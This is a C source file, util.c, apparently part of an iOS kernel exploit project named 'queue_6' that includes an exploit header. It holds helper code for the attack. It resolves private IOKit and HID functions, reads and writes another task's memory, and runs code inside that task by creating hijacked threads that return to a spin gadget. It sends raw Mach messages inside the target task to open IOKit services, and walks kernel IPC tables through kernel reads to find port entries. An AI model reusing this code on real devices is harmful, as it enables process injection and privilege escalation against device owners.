//
//  util.c
//  queue_6
//
//  Created by staturnz on 5/15/25.
//

#include "util.h"
#include "memory.h"
#include "exploit.h"

kern_return_t (*io_hideventsystem_open)(mach_port_t, mach_port_t, mach_port_t *) = NULL;
kern_return_t (*io_hideventsystem_clear_service_cache)(mach_port_t) = NULL;
kern_return_t (*io_hideventsystem_copy_matching_services)(mach_port_t, void *, int, mach_vm_address_t *, mach_vm_size_t *, mach_vm_address_t *, mach_vm_size_t *) = NULL;
kern_return_t (*io_hideventsystem_queue_create)(mach_port_t, mach_port_t, int, mach_port_t *) = NULL;
kern_return_t (*io_hideventsystem_queue_start)(mach_port_t) = NULL;
kern_return_t (*io_hideventsystem_queue_stop)(mach_port_t) = NULL;
io_service_t (*IOServiceGetMatchingService)(mach_port_t mainPort, CFDictionaryRef matching) = NULL;
CFMutableDictionaryRef (*IOServiceMatching)(const char *name) = NULL;
io_object_t (*IOIteratorNext)(uint32_t iterator) = NULL;
kern_return_t (*IOObjectRelease)(io_object_t) = NULL;
kern_return_t (*IOConnectMapMemory)(io_connect_t, uint32_t, task_port_t, vm_address_t *, vm_size_t *, uint32_t) = NULL;
kern_return_t (*IOConnectSetNotificationPort)(io_connect_t, uint32_t, mach_port_t, uintptr_t) = NULL;
kern_return_t (*IOConnectCallMethod)(mach_port_t, uint32_t, uint64_t *, uint32_t, void *, size_t, uint64_t *, uint32_t *, void *, size_t *) = NULL;
IOHIDEventRef (*IOHIDEventCreateKeyboardEvent)(CFAllocatorRef, uint64_t, uint16_t, uint16_t, Boolean, uint32_t flags) = NULL;
IOHIDEventSystemClientRef (*IOHIDEventSystemClientCreate)(CFAllocatorRef) = NULL;
void (*IOHIDEventSetSenderID)(IOHIDEventRef, uint64_t) = NULL;
void (*IOHIDEventSystemClientDispatchEvent)(IOHIDEventSystemClientRef, IOHIDEventRef) = NULL;
IOHIDEventRef (*IOHIDEventCreateAccelerometerEvent)(CFAllocatorRef, uint64_t, float, float, float, IOOptionBits options) = NULL;
kern_return_t (*IORegistryEntryGetProperty)(io_registry_entry_t, const io_name_t, io_struct_inband_t, uint32_t *) = NULL;
kern_return_t (*IOServiceClose)(io_connect_t) = NULL;
kern_return_t (*io_service_open_extended)(mach_port_t, task_t, uint32_t, NDR_record_t, io_buf_ptr_t, mach_msg_type_number_t, kern_return_t *, mach_port_t *) = NULL;
kern_return_t (*IORegistryEntryCreateIterator)(io_registry_entry_t, const io_name_t, IOOptionBits, mach_port_t *) = NULL;
kern_return_t (*IOServiceOpen)(io_service_t, task_port_t, uint32_t, io_connect_t *) = NULL;
CFTypeRef (*IORegistryEntryCreateCFProperty)(io_registry_entry_t entry, CFStringRef key, CFAllocatorRef allocator, IOOptionBits options) = NULL;
kern_return_t (*IOServiceGetMatchingServices)(mach_port_t mainPort, CFDictionaryRef matching, mach_port_t *existing) = NULL;
kern_return_t (*IOConnectSetCFProperty)(io_connect_t connect, CFStringRef propertyName, CFTypeRef property) = NULL;
kern_return_t (*IORegistryEntryCreateCFProperties)(io_registry_entry_t entry, CFMutableDictionaryRef *properties, CFAllocatorRef allocator, IOOptionBits options);

void print_log(const char *fmt, ...) {
    static bool log_opened;
    if (!log_opened) {
        openlog("bad_queue", LOG_PID | LOG_CONS, LOG_USER);
        log_opened = true;
    }
    
    va_list va;
    va_start(va, fmt);
    vsyslog(LOG_ERR, fmt, va);
    va_end(va);
}

int init_io(void) {
    void *handle = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    if (handle == NULL) {
        handle = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_NOW);
        if (handle == NULL) return -1;
    }
    
    find_io_sym(io_hideventsystem_open);
    find_io_sym(io_hideventsystem_clear_service_cache);
    find_io_sym(io_hideventsystem_copy_matching_services);
    find_io_sym(io_hideventsystem_queue_create);
    find_io_sym(io_hideventsystem_queue_start);
    find_io_sym(io_hideventsystem_queue_stop);
    find_io_sym(IOServiceGetMatchingService);
    find_io_sym(IOServiceMatching);
    find_io_sym(IOIteratorNext);
    find_io_sym(IOObjectRelease);
    find_io_sym(IOConnectMapMemory);
    find_io_sym(IOConnectSetNotificationPort);
    find_io_sym(IOConnectCallMethod);
    find_io_sym(IOHIDEventCreateKeyboardEvent);
    find_io_sym(IOHIDEventSystemClientCreate);
    find_io_sym(IOHIDEventSetSenderID);
    find_io_sym(IOHIDEventSystemClientDispatchEvent);
    find_io_sym(IOHIDEventCreateAccelerometerEvent);
    find_io_sym(IORegistryEntryGetProperty);
    find_io_sym(IOServiceClose);
    find_io_sym(io_service_open_extended);
    find_io_sym(IORegistryEntryCreateIterator);
    find_io_sym(IOServiceOpen);
    find_io_sym(IORegistryEntryCreateCFProperty);
    find_io_sym(IOServiceGetMatchingServices);
    find_io_sym(IOConnectSetCFProperty);
    find_io_sym(IORegistryEntryCreateCFProperties);
    return 0;
}


size_t task_read(mach_port_t task, uint32_t addr, void *buf, size_t size) {
    size_t off = 0;
    while (off < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - off) chunk = size - off;
        mach_vm_read_overwrite(task, addr + off, chunk, (uint32_t)buf + off, &sz);
        off += sz;
    }
    return off;
}

size_t task_write(mach_port_t task, uint32_t addr, void *buf, size_t size) {
    size_t off = 0;
    while (off < size) {
        size_t chunk = 2048;
        if (chunk > size - off) chunk = size - off;
        mach_vm_write(task, addr + off, (uint32_t)buf + off, (int)chunk);
        off += chunk;
    }
    return off;
}

uint32_t task_alloc(mach_port_t task, uint32_t size) {
    mach_vm_address_t addr = 0;
    mach_vm_allocate(task, &addr, size, VM_FLAGS_ANYWHERE);
    return (uint32_t)addr;
}

uint32_t task_free(mach_port_t task, uint32_t addr, uint32_t size) {
    mach_vm_deallocate(task, addr, size);
    return (uint32_t)addr;
}

uint32_t task_call(mach_port_t task, uint32_t ptr, void *stack_data, uint32_t stack_data_size, uint32_t r0, uint32_t r1, uint32_t r2, uint32_t r3) {
    mach_port_t thread = MACH_PORT_NULL;
    arm_thread_state_t state = {0};
    mach_msg_type_number_t count = ARM_THREAD_STATE_COUNT;
    thread_state_flavor_t flavor = ARM_THREAD_STATE;
    uint32_t stack_size = 0x40000;
    uint32_t stack_base = task_alloc(task, stack_size);
    uint32_t stack = stack_base + (stack_size / 2);
    
    state.__sp = stack;
    state.__pc = ptr;
    state.__lr = kinfo->spin_gadget | 1;
    state.__cpsr = 0x40000010;
    state.__r[0] = r0;
    state.__r[1] = r1;
    state.__r[2] = r2;
    state.__r[3] = r3;
    state.__r[4] = kinfo->spin_gadget | 1;
    
    if (stack_data != NULL) {
        task_write(task, stack, stack_data, stack_data_size);
    }
    
    if (state.__pc & 1) state.__cpsr |= 0x20;
    if (thread_create_running(task, flavor, (thread_state_t)&state, count, &thread) != 0) return 0;
    bool found = false;

    while (1) {
        usleep(1000);
        if (thread_get_state(thread, ARM_THREAD_STATE, (thread_state_t)&state, &count) != 0) break;
        if (state.__pc == kinfo->spin_gadget || state.__pc == kinfo->spin_gadget-1 || state.__pc == kinfo->spin_gadget+1) {
            found = true;
            break;
        }
    }
    
    thread_terminate(thread);
    if (!found) {
        task_free(task, stack_base, stack_size);
        return 0;
    }

    task_free(task, stack_base, stack_size);
    return state.__r[0];
}

int task_mach_msg(mach_port_t task, mach_msg_header_t *msg, int32_t opt, uint32_t send_size, uint32_t rcv_size, mach_port_t rcv_name, uint32_t timeout, mach_port_t notify) {
    uint32_t msg_size = round_page(send_size);
    uint32_t msg_buf = task_alloc(task, msg_size);
    task_write(task, msg_buf, msg, send_size);
    
    uint32_t stack_data[3] = {
        rcv_name, timeout, notify
    };
    
    int rv = task_call(task, (uint32_t)mach_msg, &stack_data[0], 12, msg_buf, opt, send_size, rcv_size);
    task_read(task, msg_buf, msg, rcv_size);
    task_free(task, msg_buf, msg_size);
    return rv;
}

mach_port_name_t task_get_host_self(mach_port_t task) {
    return (mach_port_name_t)task_call(task, (uint32_t)mach_host_self, NULL, 0, 0, 0, 0, 0);
}

mach_port_name_t task_get_reply_port(mach_port_t task) {
    return (mach_port_name_t)task_call(task, (uint32_t)mach_reply_port, NULL, 0, 0, 0, 0, 0);
}

mach_port_name_t task_get_io_main_port(mach_port_t task, mach_port_name_t host) {
    get_io_main_request_t request = {0};
    request.Head.msgh_bits = 0x1513;
    request.Head.msgh_remote_port = host;
    request.Head.msgh_local_port = task_get_reply_port(task);
    request.Head.msgh_id = 205;
    
    if (task_mach_msg(task, &request.Head, 3, 0x18, 0x30, request.Head.msgh_local_port, 0, 0) != 0) return MACH_PORT_NULL;
    return request.main.name;
}

mach_port_name_t task_get_io_service(mach_port_t task, mach_port_name_t host, mach_port_name_t io_main, const char *name) {
    char service_dict[512] = {0};
    snprintf(service_dict, 512-1, "<dict><key>IOProviderClass</key><string>%s</string></dict>", name);
    
    get_matching_services_request_t request = {0};
    request.matchingCnt = mig_strncpy(request.matching, service_dict, 512);
    request.Head.msgh_bits = 0x1513;
    request.Head.msgh_remote_port = io_main;
    request.Head.msgh_local_port = task_get_reply_port(task);
    request.Head.msgh_id = 2873;
    
    mach_msg_size_t size = (request.matchingCnt + 43) & 0xfffffffc;
    if (task_mach_msg(task, &request.Head, 3, size, 0x30, request.Head.msgh_local_port, 0, 0) != 0) return MACH_PORT_NULL;
    return *(uint32_t *)&request.NDR.int_rep;
}

mach_port_name_t task_get_io_services(mach_port_t task, mach_port_name_t host, mach_port_name_t io_main, const char *name) {
    char service_dict[512] = {0};
    snprintf(service_dict, 512-1, "<dict><key>IOProviderClass</key><string>%s</string></dict>", name);
    
    get_matching_services_request_t request = {0};
    request.matchingCnt = mig_strncpy(request.matching, service_dict, 512);
    request.Head.msgh_bits = 0x1513;
    request.Head.msgh_remote_port = io_main;
    request.Head.msgh_local_port = task_get_reply_port(task);
    request.Head.msgh_id = 2804;
    
    mach_msg_size_t size = (request.matchingCnt + 43) & 0xfffffffc;
    if (task_mach_msg(task, &request.Head, 3, size, 0x30, request.Head.msgh_local_port, 0, 0) != 0) return MACH_PORT_NULL;
    return *(uint32_t *)&request.NDR.int_rep;
}

mach_port_name_t task_open_io_service(mach_port_t task, const char *name) {
    mach_port_name_t host_port = task_get_host_self(task);
    mach_port_name_t io_main_port = task_get_io_main_port(task, host_port);
    mach_port_name_t service = task_get_io_service(task, host_port, io_main_port, name);

    service_open_request_t request = {0};
    request.msgh_body.msgh_descriptor_count = 2;
    request.Head.msgh_bits = 0x80001513;
    request.Head.msgh_size = 0;
    request.Head.msgh_remote_port = service;
    request.Head.msgh_local_port = task_get_reply_port(task);
    request.Head.msgh_voucher_port = 0;
    request.Head.msgh_id = 2862;

    request.msgh_body.msgh_descriptor_count = 2;
    request.owningTask.type = MACH_MSG_PORT_DESCRIPTOR;
    request.owningTask.disposition = MACH_MSG_TYPE_COPY_SEND;
    request.owningTask.name = 0x1407;
    request.properties.type = MACH_MSG_OOL_DESCRIPTOR;
    request.NDR = NDR_record;
    request.ndr = NDR_record;
    request.connect_type = 0;
    request.propertiesCnt = 0;
    
    if (task_mach_msg(task, &request.Head, 3, 0x4c, 0x3c, request.Head.msgh_local_port, 0, 0) != 0) return MACH_PORT_NULL;
    service_open_reply_t *reply = (service_open_reply_t *)&request;
    return reply->connection.name;
}

mach_port_name_t task_io_iterator_next(mach_port_t task, mach_port_name_t iterator) {
    union {
        io_iterator_next_request_t request;
        io_iterator_next_reply_t reply;
    } msg;
    
    msg.request.Head.msgh_bits = 0x1513;
    msg.request.Head.msgh_size = 0;
    msg.request.Head.msgh_remote_port = iterator;
    msg.request.Head.msgh_local_port = task_get_reply_port(task);
    msg.request.Head.msgh_voucher_port = 0;
    msg.request.Head.msgh_id = 2802;
    
    if (task_mach_msg(task, &msg.request.Head, 3, 0x18, 0x30, msg.request.Head.msgh_local_port, 0, 0) != 0) return MACH_PORT_NULL;
    return msg.reply.object.name;
}


mach_port_name_t task_open_io_service_class(mach_port_t task, const char *service_name, const char *class_name) {
    mach_port_name_t host_port = task_get_host_self(task);
    mach_port_name_t io_main_port = task_get_io_main_port(task, host_port);
    mach_port_name_t service_list = task_get_io_services(task, host_port, io_main_port, service_name);
    if (service_list == MACH_PORT_NULL) return MACH_PORT_NULL;
    
    CFStringRef target_cls = CFStringCreateWithCString(NULL, class_name, kCFStringEncodingUTF8);
    mach_port_name_t iter = MACH_PORT_NULL;
    mach_port_t iter_local = MACH_PORT_NULL;
    bool found = false;
    
    while ((iter = task_io_iterator_next(task, service_list)) != MACH_PORT_NULL) {
        if ((iter_local = task_extract_port(task, iter)) == MACH_PORT_NULL) continue;
        CFStringRef cls = IORegistryEntryCreateCFProperty(iter_local, CFSTR("IOClass"), NULL, 0);

        if (cls != NULL && CFEqual(cls, target_cls)) {
            found = true;
            break;
        }
    }
    
    CFRelease(target_cls);
    if (!found) return MACH_PORT_NULL;
    
    service_open_request_t request = {0};
    request.msgh_body.msgh_descriptor_count = 2;
    request.Head.msgh_bits = 0x80001513;
    request.Head.msgh_size = 0;
    request.Head.msgh_remote_port = iter;
    request.Head.msgh_local_port = task_get_reply_port(task);
    request.Head.msgh_voucher_port = 0;
    request.Head.msgh_id = 2862;

    request.msgh_body.msgh_descriptor_count = 2;
    request.owningTask.type = MACH_MSG_PORT_DESCRIPTOR;
    request.owningTask.disposition = MACH_MSG_TYPE_COPY_SEND;
    request.owningTask.name = 0x1407;
    request.properties.type = MACH_MSG_OOL_DESCRIPTOR;
    request.NDR = NDR_record;
    request.ndr = NDR_record;
    request.connect_type = 0;
    request.propertiesCnt = 0;
    
    if (task_mach_msg(task, &request.Head, 3, 0x4c, 0x3c, request.Head.msgh_local_port, 0, 0) != 0) return MACH_PORT_NULL;
    service_open_reply_t *reply = (service_open_reply_t *)&request;
    return reply->connection.name;
}

mach_port_t task_extract_port(mach_port_t task, mach_port_name_t target_port) {
    mach_port_t local_port = MACH_PORT_NULL;
    mach_msg_type_name_t local_right = 0;
    
    int kr = mach_port_extract_right(task, target_port, MACH_MSG_TYPE_COPY_SEND, &local_port, &local_right);
    if (kr != 0 || !MACH_PORT_VALID(local_port)) return MACH_PORT_NULL;
    return local_port;
}

kern_return_t io_connect_set_notification_port_copy_send(mach_port_t connect, uint32_t type, mach_port_t port, uint32_t ref) {
    union {
        set_notification_request_t input;
        set_notification_reply_t output;
    } msg;
    
    msg.input.Head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.input.Head.msgh_remote_port = connect;
    msg.input.Head.msgh_local_port = mig_get_reply_port();
    msg.input.Head.msgh_id = 2818;

    msg.input.Head.msgh_reserved = 0;
    msg.input.msgh_body.msgh_descriptor_count= 1;
    
    msg.input.port.name = port;
    msg.input.port.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.input.port.type = MACH_MSG_PORT_DESCRIPTOR;
    msg.input.NDR = NDR_record;
    msg.input.notification_type = type;
    msg.input.reference = ref;
    
    return mach_msg(&msg.input.Head, 3, 0x38, 0x2c, msg.input.Head.msgh_local_port, 0, 0);
}

uint32_t find_port(mach_port_t port) {
    uint32_t itk_space = kread32(kinfo->self_task_addr + koffsetof(task, itk_space));
    uint32_t is_table = kread32(itk_space + koffsetof(ipc_space, is_table));
    return kread32(is_table + ((port >> 8) * koffsetof(ipc_entry, size)));
}
